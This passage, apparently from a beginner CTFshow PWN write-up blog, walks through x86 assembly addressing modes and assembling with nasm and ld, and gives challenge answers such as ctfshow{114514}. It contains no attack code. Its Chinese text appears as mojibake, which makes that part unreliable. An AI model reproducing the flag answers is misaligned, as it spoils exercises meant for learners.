&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;add&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;ecx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;          &lt;span class=&#34;c1&#34;&gt;; å°†ecxåŠ ä¸Š4&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;ecx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;      &lt;span class=&#34;c1&#34;&gt;; å°†ecxæ‰€æŒ‡å‘çš„åœ°å€çš„å€¼èµ‹å€¼ç»™eax&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;; åŸºå€å˜å€å¯»å€æ–¹å¼&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;ecx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;msg&lt;/span&gt;        &lt;span class=&#34;c1&#34;&gt;; å°†msgçš„åœ°å€èµ‹å€¼ç»™ecx&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;edx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;          &lt;span class=&#34;c1&#34;&gt;; å°†2èµ‹å€¼ç»™edx&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;ecx&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;edx&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;; å°†ecx+edx*2æ‰€æŒ‡å‘çš„åœ°å€çš„å€¼èµ‹å€¼ç»™eax&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;; ç›¸å¯¹åŸºå€å˜å€å¯»å€æ–¹å¼&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;ecx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;msg&lt;/span&gt;        &lt;span class=&#34;c1&#34;&gt;; å°†msgçš„åœ°å€èµ‹å€¼ç»™ecx&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;edx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;          &lt;span class=&#34;c1&#34;&gt;; å°†1èµ‹å€¼ç»™edx&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;add&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;ecx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;          &lt;span class=&#34;c1&#34;&gt;; å°†ecxåŠ ä¸Š8&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;ecx&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;edx&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;; å°†ecx+edx*2-6æ‰€æŒ‡å‘çš„åœ°å€çš„å€¼èµ‹å€¼ç»™eax&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;; è¾“å‡ºå­—ç¬¦ä¸²&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;          &lt;span class=&#34;c1&#34;&gt;; ç³»ç»Ÿè°ƒç”¨å·4ä»£è¡¨è¾“å‡ºå­—ç¬¦ä¸²&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;ebx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;          &lt;span class=&#34;c1&#34;&gt;; æ–‡ä»¶æè¿°ç¬¦1ä»£è¡¨æ ‡å‡†è¾“å‡º&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;ecx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;msg&lt;/span&gt;        &lt;span class=&#34;c1&#34;&gt;; è¦è¾“å‡ºçš„å­—ç¬¦ä¸²çš„åœ°å€&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;edx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;22&lt;/span&gt;         &lt;span class=&#34;c1&#34;&gt;; è¦è¾“å‡ºçš„å­—ç¬¦ä¸²çš„é•¿åº¦&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x80&lt;/span&gt;            &lt;span class=&#34;c1&#34;&gt;; è°ƒç”¨ç³»ç»Ÿè°ƒç”¨&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;; é€€å‡ºç¨‹åº&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;          &lt;span class=&#34;c1&#34;&gt;; ç³»ç»Ÿè°ƒç”¨å·1ä»£è¡¨é€€å‡ºç¨‹åº&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;xor&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;ebx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;ebx&lt;/span&gt;        &lt;span class=&#34;c1&#34;&gt;; è¿”å›å€¼ä¸º0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x80&lt;/span&gt;            &lt;span class=&#34;c1&#34;&gt;; è°ƒç”¨ç³»ç»Ÿè°ƒç”¨&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;checksecä¸€ä¸‹è¿™ä¸ªPWNæ–‡ä»¶ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/18.png&#34;
	width=&#34;560&#34;
	height=&#34;160&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/18_hu_b88e80be1380d264.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/18_hu_edb93148c7d1aae7.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;350&#34;
		data-flex-basis=&#34;840px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;ohohè¿™ä¸ªä¿æŠ¤å…¨å…³çš„ï¼IDAçš„x32ä½&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/19.png&#34;
	width=&#34;986&#34;
	height=&#34;270&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/19_hu_5a1e69eadca2a8dd.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/19_hu_94c08c2f6f98fd2d.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;365&#34;
		data-flex-basis=&#34;876px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;è¿™ä¸ªæ²¡mainå‡½æ•°ï¼Œé‚£æˆ‘ä»¬å›çœ‹é‚£æ®µæ±‡ç¼–è¯­è¨€asmï¼Œè¿™æ®µæ±‡ç¼–è¯­è¨€æ›´åƒæ˜¯åœ¨å¸®åŠ©æˆ‘ä»¬äº†è§£æ±‡ç¼–è¯­è¨€çš„é€»è¾‘è¯­æ³•è§„åˆ™çš„ï¼Œåœ¨&lt;a class=&#34;link&#34; href=&#34;https://expl0rer.top/p/pwn-1/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;PWN-1&lt;/a&gt;æ–‡ç« ä¸­å°±æœ‰è®²è¿‡æ±‡ç¼–è¯­è¨€ï¼Œè¿™é‡Œå°±ç›´æ¥è·³è¿‡è¯¦è§£&lt;/p&gt;
&lt;p&gt;è¿™é¢˜å¼€å§‹å°±æœ‰ç‚¹å˜æ ·äº†ï¼Œâ€œWelcome_to_CTFshow.asmâ€è¿™æ–‡ä»¶æ˜¯ä¸€ä¸ªå­˜æ”¾æ±‡ç¼–è¯­è¨€çš„æ–‡æœ¬æ–‡ä»¶ï¼Œéœ€è¦è¿è¡Œä¸€ä¸‹è½¬æ¢æˆåƒexeè¿™æ ·çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œåœ¨PWN-1è®²è¿‡elfæ–‡ä»¶ï¼š&lt;/p&gt;
&lt;blockquote class=&#34;alert alert-note&#34;&gt;
    &lt;blockquote&gt;
&lt;p&gt;å°†æ±‡ç¼–è¯­è¨€ï¼ˆ.asmï¼‰æ–‡ä»¶è½¬æ¢ä¸ºå¯æ‰§è¡Œæ–‡ä»¶ï¼Œéœ€è¦ç»è¿‡&lt;strong&gt;æ±‡ç¼–ï¼ˆAssembleï¼‰&lt;/strong&gt; å’Œ&lt;strong&gt;é“¾æ¥ï¼ˆLinkï¼‰&lt;/strong&gt; ä¸¤ä¸ªæ ¸å¿ƒæ­¥éª¤.&lt;/p&gt;&lt;/blockquote&gt;&lt;/blockquote&gt;
&lt;p&gt;åœ¨Kali/Linuxä¸Šä¸‹è½½nasmç¼–è¾‘å™¨ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo apt install nasm
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;ç„¶åä¸‹è½½ldé“¾æ¥å™¨ï¼ˆé€šå¸¸è‡ªå¸¦ï¼‰ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo apt update &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; sudo apt install binutils
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;æ±‡ç¼–è½¬æ¢ï¼šå°† .asm è½¬æ¢ä¸ºç›®æ ‡æ–‡ä»¶ï¼ˆ.obj æˆ– .oï¼‰&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nasm -f elf Welcome_to_CTFshow.asm
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;æ±‡ç¼–ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ld -m elf_i386 -s -o Welcome_to_CTFshow1 Welcome_to_CTFshow.o
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;ï¼ˆWelcome_to_CTFshow1æ˜¯å¯æ‰§è¡Œæ–‡ä»¶ï¼‰&lt;/p&gt;
&lt;p&gt;æˆ‘çš„å»ºè®®æ±‡ç¼–è½¬æ¢å’Œç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶çš„è¿‡ç¨‹éƒ½åœ¨Kali/Linux/Ubuntuä¸Šï¼Œæ¯”è¾ƒæ–¹ä¾¿ï¼Œwindowsä¸‹è½½æ¯”è¾ƒéº»çƒ¦ã€‚&lt;/p&gt;
&lt;p&gt;ç”Ÿæˆè¿™ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ä¹‹åï¼Œç›´æ¥è¿è¡Œå°±èƒ½å¾—åˆ°è¾“å‡ºç»“æœäº†ï¼ŒæŒ‰ç…§é¢˜ç›®è¦æ±‚ï¼ŒåŠ ä¸ª{}åŒ…çš®å»æäº¤å°±å¥½äº†ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/20.png&#34;
	width=&#34;765&#34;
	height=&#34;230&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/20_hu_9d3cd65ccf046d84.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/20_hu_f0e09656aebee87e.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;332&#34;
		data-flex-basis=&#34;798px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/21.png&#34;
	width=&#34;1040&#34;
	height=&#34;295&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/21_hu_96a8674a27a83293.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/21_hu_adca9e8247769340.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;352&#34;
		data-flex-basis=&#34;846px&#34;
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;pwn_006&#34;&gt;PWN_006
&lt;/h3&gt;&lt;p&gt;é¢˜ç›®ï¼šç«‹å³å¯»å€æ–¹å¼ç»“æŸåeaxå¯„å­˜å™¨çš„å€¼ä¸ºï¼Ÿ&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;PWN_006%5cWelcome_to_CTFshow&#34; &gt;Welcome_to_CTFshow&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;PWN_006%5cWelcome_to_CTFshow.asm&#34; &gt;Welcome_to_CTFshow.asm&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;æŒ‰ç…§PWN-005é‚£æ ·å»è½¬æ¢ç”Ÿæˆè¿™ä¸ªå¯æ‰§è¡Œæ–‡ä»¶&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;æ±‡ç¼–è½¬æ¢ï¼šå°† .asm è½¬æ¢ä¸ºç›®æ ‡æ–‡ä»¶ï¼ˆ.obj æˆ– .oï¼‰&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nasm -f elf Welcome_to_CTFshow.asm
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;æ±‡ç¼–ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ld -m elf_i386 -s -o Welcome_to_CTFshow1 Welcome_to_CTFshow.o
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;ï¼ˆWelcome_to_CTFshow1æ˜¯å¯æ‰§è¡Œæ–‡ä»¶ï¼‰&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/22.png&#34;
	width=&#34;618&#34;
	height=&#34;155&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/22_hu_38c3a83cb1d6b3d2.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/22_hu_15cc2bc9e2e15087.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;398&#34;
		data-flex-basis=&#34;956px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;Welcome_to_CTFshow_PWN???æ˜¯flagï¼Œé”™äº†ï¼Œé¢˜ç›®æ˜¯&lt;strong&gt;ç«‹å³å¯»å€&lt;/strong&gt;æ–¹å¼ç»“æŸå&lt;strong&gt;eaxå¯„å­˜å™¨çš„å€¼&lt;/strong&gt;ä¸ºï¼Ÿ&lt;/p&gt;
&lt;p&gt;é‚£å°±æ˜¯å¾—æŠŠè¿™ä¸ªè½¬æ¢å‡ºçš„å¯æ‰§è¡Œæ–‡ä»¶æ”¾åˆ°IDAä¸Šï¼Œä¸è¿‡ä¹‹å‰è®°å¾—checksecä¸€ä¸‹çœ‹çœ‹æ˜¯x32è¿˜æ˜¯x64ä½å“¦&amp;hellip;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;; ç«‹å³å¯»å€æ–¹å¼&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;11&lt;/span&gt;        &lt;span class=&#34;c1&#34;&gt;; å°†11èµ‹å€¼ç»™eax&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;add&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;114504&lt;/span&gt;    &lt;span class=&#34;c1&#34;&gt;; eaxåŠ ä¸Š114504&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;sub&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;         &lt;span class=&#34;c1&#34;&gt;; eaxå‡å»1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/23.png&#34;
	width=&#34;1153&#34;
	height=&#34;151&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/23_hu_d9da713c30313d8.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/23_hu_9162e9b7e00f4ccc.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;763&#34;
		data-flex-basis=&#34;1832px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;é‚£å°±åŠ å‡æ³•å’¯ï¼š11+114504-1=114514&lt;/p&gt;
&lt;p&gt;ctfshow{114514}&lt;/p&gt;
&lt;h3 id=&#34;pwn_007&#34;&gt;PWN_007
